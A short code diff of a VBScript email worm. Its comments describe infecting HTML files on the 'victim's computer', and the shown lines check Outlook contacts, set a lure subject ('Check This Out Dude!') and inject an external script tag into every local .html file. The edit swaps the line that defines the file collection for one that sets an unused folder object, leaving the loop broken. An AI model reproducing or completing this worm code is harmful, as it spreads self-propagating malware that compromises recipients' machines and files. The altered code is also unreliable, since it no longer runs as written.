@@ -7,7 +7,7 @@ strEmailSubject = "Check This Out Dude!"
 ' Check if there are any email addresses in the Outlook contacts
 If objOutlook.Session.AddressLists.Count > 0 Then
 ' Infect HTML files on the victim's computer
-Set objHTMLFiles = objFSO.GetFolder(objFSO.GetParentFolderName(WScript.ScriptFullName)).Files
+Set objFolder = objFSO.GetFolder(objFSO.GetParentFolderName(WScript.ScriptFullName))
 For Each objHTMLFile In objHTMLFiles
 If LCase(objFSO.GetExtensionName(objHTMLFile.Name)) = "html" Then
 strNewHTMLContent = Replace(objHTMLFile.OpenAsTextStream.ReadAll, "</head>", "<script src=""" & strFilePath & """></script></head>")
